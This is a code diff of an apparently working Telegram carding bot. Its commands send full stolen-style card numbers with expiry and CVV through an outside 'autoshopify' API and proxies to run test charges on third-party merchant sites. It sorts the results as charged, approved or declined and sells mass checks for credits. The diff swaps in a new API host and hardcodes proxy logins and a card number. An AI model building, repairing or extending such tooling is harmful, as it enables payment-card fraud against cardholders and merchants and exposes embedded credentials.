@@ -2610,6 +2610,11 @@ CURRENT_SHOPIFY_SITE = "https://happyhealthyyou.com"
 
 logger = logging.getLogger(__name__)
 
+import urllib.parse
+
+AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php/"
+DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+
 async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global CURRENT_SHOPIFY_SITE
 
@@ -2625,11 +2630,15 @@ async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYP
 
     # --- Test the site via API using a dummy card ---
     test_card = "4242424242424242|12|2025|123"
+    encoded_site = urllib.parse.quote_plus(new_site)
+    encoded_card = urllib.parse.quote_plus(test_card)
+    encoded_proxy = urllib.parse.quote_plus(DEFAULT_PROXY)
+
     api_url = (
-        f"https://autoshopify-dark.sevalla.app/index.php"
-        f"?site={new_site}"
-        f"&cc={test_card}"
-        f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
+        f"{AUTOSH_BASE}"
+        f"?site={encoded_site}"
+        f"&cc={encoded_card}"
+        f"&proxy={encoded_proxy}"
     )
 
     try:
@@ -2703,11 +2712,16 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         )
 
         # --- API request ---
+        # Encode site and card so special chars like '|' don't break the query
+        encoded_site = urllib.parse.quote_plus(CURRENT_SHOPIFY_SITE)
+        encoded_cc = urllib.parse.quote_plus(full_card)
+        encoded_proxy = urllib.parse.quote_plus(DEFAULT_PROXY)
+
         api_url = (
-            f"https://autoshopify-dark.sevalla.app/index.php"
-            f"?site={CURRENT_SHOPIFY_SITE}"
-            f"&cc={full_card}"
-            f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
+            f"{AUTOSH_BASE}"
+            f"?site={encoded_site}"
+            f"&cc={encoded_cc}"
+            f"&proxy={encoded_proxy}"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -2808,6 +2822,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
 
 
+
 # --- Main /sh command ---
 import re
 
@@ -2902,11 +2917,15 @@ import re
 logger = logging.getLogger(__name__)
 
 # --- HC Processor ---
+import urllib.parse
+
+AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php/"
+HC_PROXY = "107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+
 async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
     Process a /hc command: check HC card, display response and BIN info.
     """
-
     try:
         user = update.effective_user
 
@@ -2946,11 +2965,15 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         )
 
         # --- API request ---
+        encoded_card = urllib.parse.quote_plus(full_card)
+        encoded_proxy = urllib.parse.quote_plus(HC_PROXY)
+        encoded_site = urllib.parse.quote_plus("https://shop.outsideonline.com")
+
         api_url = (
-            f"https://autoshopify-dark.sevalla.app/index.php"
-            f"?site=https://shop.outsideonline.com"
-            f"&cc={full_card}"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"{AUTOSH_BASE}"
+            f"?site={encoded_site}"
+            f"&cc={encoded_card}"
+            f"&proxy={encoded_proxy}"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -3138,6 +3161,12 @@ import re
 logger = logging.getLogger(__name__)
 
 # --- HC Processor ---
+import urllib.parse
+
+AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php/"
+ST1_PROXY = "107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+ST1_SITE = "https://vasileandpavel.com"
+
 async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
     Process a /st1 command: check Stripe charge, display response and BIN info.
@@ -3182,12 +3211,17 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         )
 
         # --- API request ---
+        encoded_card = urllib.parse.quote_plus(full_card)
+        encoded_site = urllib.parse.quote_plus(ST1_SITE)
+        encoded_proxy = urllib.parse.quote_plus(ST1_PROXY)
+        encoded_gateway = urllib.parse.quote_plus("stripe")
+
         api_url = (
-            f"https://autoshopify-dark.sevalla.app/index.php"
-            f"?site=https://vasileandpavel.com"
-            f"&cc={full_card}"
-            f"&gateway=stripe"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"{AUTOSH_BASE}"
+            f"?site={encoded_site}"
+            f"&cc={encoded_card}"
+            f"&gateway={encoded_gateway}"
+            f"&proxy={encoded_proxy}"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -3232,8 +3266,10 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
-        # --- Enhance response with emojis ---
+        # --- Enhance response with emojis + status ---
         display_response = escape(response)
+        header_status = "❌ Declined"  # default
+
         if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
             display_response = f"{escape(response)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
             header_status = "🔥 Charged"
@@ -3245,8 +3281,6 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         elif "INSUFFICIENT_FUNDS" in response.upper():
             header_status = "✅ Approved"
         elif "CARD_DECLINED" in response.upper():
-            header_status = "❌ Declined"
-        else:
             header_status = "❌ Declined"
 
         # --- Final formatted message ---
@@ -3643,24 +3677,28 @@ async def consume_credit(user_id: int) -> bool:
 
 # --- HC Processor ---
 import aiohttp
-import asyncio
 import json
-import logging
 import re
+import logging
 from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
+from db import get_user, update_user
+from bin import get_bin_info
 
 logger = logging.getLogger(__name__)
 
-# === Your helper functions (assumed already defined elsewhere) ===
-# - consume_credit(user_id) -> bool
-# - get_bin_info(bin_number: str) -> dict
+# --- Config ---
+AUTOSH_AT_API = "https://autosh.arpitchk.shop/puto.php/"
+DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"
+
 
 async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
     Process a /at command: check AuthNet card, display response and BIN info.
+    Gateway label = AuthNet, Price = 2.5$
     """
     try:
         user = update.effective_user
@@ -3702,10 +3740,10 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://autoshopify-dark.sevalla.app/index.php"
-            f"?site=https://unikeyhealth.com"
+            f"{AUTOSH_AT_API}"
+            f"?site={AUTHNET_DEFAULT_SITE}"
             f"&cc={full_card}"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"&proxy={DEFAULT_PROXY}"
         )
 
         try:
@@ -3734,8 +3772,8 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             return
 
         response = data.get("Response", "Unknown")
-        gateway = data.get("Gateway", "AuthNet")
-        price = data.get("Price", "2.5$")
+        gateway = "AuthNet"
+        price = "2.5$"
 
         # --- BIN lookup ---
         try:
@@ -3782,7 +3820,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         final_msg = (
             f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟐.𝟓$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 {price}\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -3892,21 +3930,34 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-async def process_seturl(user, user_id, site_input, processing_msg):
-    """Background worker that does the API call + DB update"""
+async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
+    """
+    Background worker that adds a custom site for a user and calls the dynamic API
+    to validate the site with a custom credit card. Updates DB and formats a response message.
+    """
 
+    # --- API setup ---
     api_url = (
-        "https://autoshopify-dark.sevalla.app/index.php"
+        "https://autosh.arpitchk.shop/puto.php/"
         f"?site={site_input}"
-        "&cc=4312311807552605|08|2031|631"
-        "&proxy=qhlpirsk-5325:96zjmb7awmom@p.webshare.io:80"
+        f"&cc={cc_input}"
+        "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
     )
 
+    BULLET_GROUP_LINK = "https://t.me/CARDER33"
+    bullet_text = "[⌇]"
+    bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
+    DEVELOPER_NAME = "kคli liຖนxx"
+    DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
+
     try:
+        # --- API request ---
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=50) as resp:
+            async with session.get(api_url, timeout=50, headers={"User-Agent": "Mozilla/5.0"}) as resp:
                 raw_text = await resp.text()
 
+        # --- Parse API response ---
         try:
             data = json.loads(raw_text)
         except json.JSONDecodeError:
@@ -3917,39 +3968,31 @@ async def process_seturl(user, user_id, site_input, processing_msg):
             return
 
         response = data.get("Response", "Unknown")
-        status = data.get("Status", "Unknown")
+        status = data.get("Response", "Unknown")  # This API does not return 'Status', use Response
         price = data.get("Price", "0.0")
-        gateway = data.get("Gateway", "N/A")
+        gateway = data.get("Gateway", "Shopify Normal")
 
         # --- Fetch existing sites from DB ---
         user_data = await get_user(user_id)
         current_sites = user_data.get("custom_urls", []) or []
 
-        # Append new site if not already present
+        # --- Append new site if not already present ---
         if site_input not in current_sites:
             current_sites.append(site_input)
-
-        # Save updated list back to DB
-        await update_user(user_id, custom_urls=current_sites)
+            await update_user(user_id, custom_urls=current_sites)
 
         requester = f"@{user.username}" if user.username else str(user.id)
-        DEVELOPER_NAME = "kคli liຖนxx"
-        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
-        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
+        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if response.upper() != "CARD_DECLINED" else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
 
-        BULLET_GROUP_LINK = "https://t.me/CARDER33"
-        bullet_text = "[⌇]"
-        bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
-
-        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if status.lower() == "true" else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
-
+        # --- Format final message ---
         formatted_msg = (
             f"◇━━〔 <b>{site_status}</b> 〕━━◇\n"
             f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➵ <code>{escape(site_input)}</code>\n"
             f"{bullet_link} <b>𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬</b> ➵ {len(current_sites)}\n"
-            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙉𝙤𝙧𝙢𝙖𝙡\n"
+            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➵ {gateway}\n"
+            f"{bullet_link} <b>𝐂𝐂</b> ➵ <code>{escape(cc_input)}</code>\n"
             f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➵ <i>{escape(response)}</i>\n"
-            f"{bullet_link} <b>𝐏𝐫𝐢𝐜𝐞</b> ➵ {escape(price)}$ 💸\n"
+            f"{bullet_link} <b>𝐏𝐫𝐢𝐜𝐞</b> ➵ {escape(str(price))}$ 💸\n"
             "――――――――――――――――\n"
             f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➵ {requester}\n"
             f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➵ {developer_clickable}\n"
@@ -3974,6 +4017,7 @@ async def process_seturl(user, user_id, site_input, processing_msg):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
@@ -4060,12 +4104,11 @@ async def consume_credit(user_id: int) -> bool:
 
 # ===== API template =====
 API_CHECK_TEMPLATE = (
-    "https://autoshopify-dark.sevalla.app/index.php"
+    "https://autosh.arpitchk.shop/puto.php/"
     "?site={site}"
     "&cc={card}"
-    "&proxy=qhlpirsk-5338:96zjmb7awmom@p.webshare.io:80"
+    "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 )
-
 # ===== Main Command =====
 import re
 from html import escape  # for escaping card_input safely in HTML
@@ -4171,19 +4214,17 @@ async def process_card_check(user, card_input, custom_urls, msg):
             country_name = "Unknown"
             country_flag = "🏳️"
 
-        # --- Check all sites in parallel ---
         best_result = None
 
         async def check_site(site):
             nonlocal best_result
-            # Ensure HTTPS
             if not site.startswith("http://") and not site.startswith("https://"):
                 site = "https://" + site
 
             api_url = API_CHECK_TEMPLATE.format(card=card_input, site=site)
             async with aiohttp.ClientSession() as session:
                 try:
-                    async with session.get(api_url, timeout=30) as resp:
+                    async with session.get(api_url, timeout=30, headers={"User-Agent": "Mozilla/5.0"}) as resp:
                         api_text = await resp.text()
                 except Exception:
                     return
@@ -4192,13 +4233,8 @@ async def process_card_check(user, card_input, custom_urls, msg):
             if '<!DOCTYPE html>' in api_text or '<html' in api_text:
                 return
 
-            clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
-            json_start = clean_text.find('{')
-            if json_start != -1:
-                clean_text = clean_text[json_start:]
-
             try:
-                data = json.loads(clean_text)
+                data = json.loads(api_text)
             except json.JSONDecodeError:
                 return
 
@@ -4213,21 +4249,21 @@ async def process_card_check(user, card_input, custom_urls, msg):
                    ("3D_AUTHENTICATION" in resp_text and prev_resp not in ["CHARGED", "APPROVED"]):
                     best_result = {**data, "site": site}
 
-        # Run checks in parallel
+        # Run all site checks in parallel
         await asyncio.gather(*(check_site(site) for site in custom_urls))
 
         if not best_result:
             await msg.edit_text("❌ No valid responses from any site.", parse_mode=ParseMode.HTML)
             return
 
-        # Extract fields
+        # Extract response
         response_text = best_result.get("Response", "Unknown")
         price = f"{best_result.get('Price', '0')}$"
-        gateway = best_result.get("Gateway", "Shopify")
+        gateway = best_result.get("Gateway", "Normal Shopify")
         site_used = best_result.get("site", "N/A")
 
-        # --- Dynamic Header Status ---
-        header_status = "❌ Declined"  # default
+        # --- Dynamic header status ---
+        header_status = "❌ Declined"
         if re.search(r"\b(Thank You|approved|success|charged)\b", response_text, re.I):
             header_status = "🔥 Charged"
         elif "3D_AUTHENTICATION" in response_text.upper():
@@ -4241,7 +4277,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
         full_name = " ".join(filter(None, [user.first_name, user.last_name]))
         requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
 
-        # --- Enhance Response ---
+        # --- Enhance response ---
         display_response = escape(response_text)
         if re.search(r"\b(Thank You|approved|charged|success)\b", response_text, re.I):
             display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
@@ -4258,7 +4294,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
         BULLET_GROUP_LINK = "https://t.me/CARDER33"
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-        # --- Final Message ---
+        # --- Final message ---
         formatted_msg = f"""
 ◇━━〔 <b>{header_status}</b> 〕━━◇
 {bullet_link} 𝐂𝐚𝐫𝐝       ➵ <code>{card_input}</code>
@@ -4274,7 +4310,6 @@ async def process_card_check(user, card_input, custom_urls, msg):
 {bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}
 ――――――――――――――――
 """
-
         await msg.edit_text(formatted_msg.strip(),
                             parse_mode=ParseMode.HTML,
                             disable_web_page_preview=True)
@@ -4285,8 +4320,6 @@ async def process_card_check(user, card_input, custom_urls, msg):
         logger.exception("Error in process_card_check")
         await msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>",
                             parse_mode=ParseMode.HTML)
-
-
 
 
 
@@ -4310,9 +4343,12 @@ from db import get_user, update_user   # DB functions
 # Cooldown tracker
 last_site_usage = {}
 
+# ===== Updated API template =====
 API_TEMPLATE = (
-    "https://autoshopify-dark.sevalla.app/index.php"
-    "?site={site_url}&cc=4312311807552605|08|2031|631"
+    "https://autosh.arpitchk.shop/puto.php"
+    "?site={site_url}"
+    "&cc=4312311807552605|08|2031|631"
+    "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 )
 
 # === Credit system ===
@@ -4323,7 +4359,6 @@ async def consume_credit(user_id: int) -> bool:
         await update_user(user_id, credits=new_credits)
         return True
     return False
-
 
 # === Main command ===
 async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -4374,7 +4409,7 @@ async def run_site_check(site_url: str, msg, user):
 
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=120) as resp:
+            async with session.get(api_url, timeout=120, headers={"User-Agent": "Mozilla/5.0"}) as resp:
                 raw_text = await resp.text()
 
         # --- Extract JSON part if wrapped in HTML ---
@@ -4440,6 +4475,7 @@ async def run_site_check(site_url: str, msg, user):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 import asyncio
@@ -4720,7 +4756,7 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
 
     url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
     try:
-        r = await session.get(url, timeout=55)  # ✅ 55s timeout
+        r = await session.get(url, timeout=55)  # 55s timeout
         data = r.json()
         return (
             data.get("Response", "Unknown"),
@@ -4731,17 +4767,15 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
     except Exception as e:
         return f"Error: {str(e)}", "false", "0", "N/A"
 
-
-# ===== Background runner =====
+# === Background runner for mass check ===
 async def run_msp(update: Update, cards, base_url, sites, msg):
     approved = declined = errors = checked = 0
     site_price = None
     gateway_used = "Self Shopify"
     results = []
-    sem = asyncio.Semaphore(5)  # Moderate concurrency
+    sem = asyncio.Semaphore(5)
     lock = asyncio.Lock()
 
-    # Priority map
     PRIORITY = {
         "CHARGED": 4,
         "THANK YOU": 4,
@@ -4760,8 +4794,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     }
 
     async with httpx.AsyncClient() as session:
-        proxy = "qhlpirsk-5331:96zjmb7awmom@p.webshare.io:80"
-
+        proxy = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"  # Updated proxy
 
         async def check_one(card, site):
             card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
@@ -4790,11 +4823,9 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
         async def worker(card):
             nonlocal approved, declined, errors, checked, results
             async with sem:
-                # Check card on all sites concurrently
                 tasks = [check_one(card, site) for site in sites]
                 responses = await asyncio.gather(*tasks, return_exceptions=True)
 
-                # Pick best response
                 best_resp, best_score = "Unknown", 0
                 for r in responses:
                     if isinstance(r, Exception):
@@ -4804,7 +4835,6 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                     if score > best_score:
                         best_resp, best_score = resp_str, score
 
-                # Classification
                 if best_score >= 4:
                     approved += 1
                     status_icon = "✅"
@@ -4826,7 +4856,6 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                 result_line = f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{display_resp}</i>"
                 results.append(result_line)
 
-                # Update summary in Telegram
                 async with lock:
                     summary_text = (
                         "<pre><code>"
@@ -4843,34 +4872,25 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                         f"#AutoshopifyChecks\n"
                         f"────────────────\n"
                     )
-                    # Only show last 20 results to avoid long messages
                     final_text = summary_text + "\n".join(results[-20:])
                     try:
                         await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)
                     except:
                         pass
-                    await asyncio.sleep(0.1)  # Small delay to avoid flooding
+                    await asyncio.sleep(0.1)
 
-        # Run all cards sequentially (each card checks all sites concurrently)
         for card in cards:
             await worker(card)
 
-
-# ===== /msp command =====
-from telegram.constants import ParseMode
-
-BULLET_GROUP_LINK = "https://t.me/CARDER33"
-
+# === /msp command ===
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
 
-    # Cooldown check (5 seconds)
     if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
         return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
     last_msp_usage[user_id] = now
 
-    # Extract input text from args or replied message
     raw_input = None
     if context.args:
         raw_input = " ".join(context.args)
@@ -4879,34 +4899,29 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not raw_input:
         return await update.message.reply_text(
-            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\n"
-            "Or reply to a message containing cards.",
+            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\nOr reply to a message containing cards.",
             parse_mode=ParseMode.HTML
         )
 
-    # Extract cards using regex (make sure CARD_REGEX is defined)
     cards = [m.group(0) for m in CARD_REGEX.finditer(raw_input)]
     if not cards:
         return await update.message.reply_text("❌ No valid cards found.")
     if len(cards) > 50:
         cards = cards[:50]
 
-    # Fetch user data and credits
     user_data = await get_user(user_id)
     if not user_data:
         return await update.message.reply_text("❌ No user data found in DB.")
     if not await consume_credit(user_id):
         return await update.message.reply_text("❌ You have no credits left.")
 
-    base_url = user_data.get("base_url", "https://autoshopify-dark.sevalla.app/index.php")
+    base_url = user_data.get("base_url", "https://autosh.arpitchk.shop/puto.php")  # updated API
     sites = user_data.get("custom_urls", [])
     if not sites:
         return await update.message.reply_text("❌ No sites found in your account.")
 
-    # Build bullet link HTML
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-    # Compose processing message (stylish bold Mass Check Ongoing)
     processing_text = (
         f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
         f"<pre><code>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 𝗢𝗻𝗴𝗼𝗶𝗻𝗴</code></pre>\n"
@@ -4914,16 +4929,13 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} 𝗦𝘁𝗮𝘁𝘂𝘀 ➵ Checking 🔎..."
     )
 
-    # Send fancy processing message
     msg = await update.message.reply_text(
         processing_text,
         parse_mode=ParseMode.HTML,
         disable_web_page_preview=True
     )
 
-    # Start background task
     asyncio.create_task(run_msp(update, cards, base_url, sites, msg))
-
 
 
 
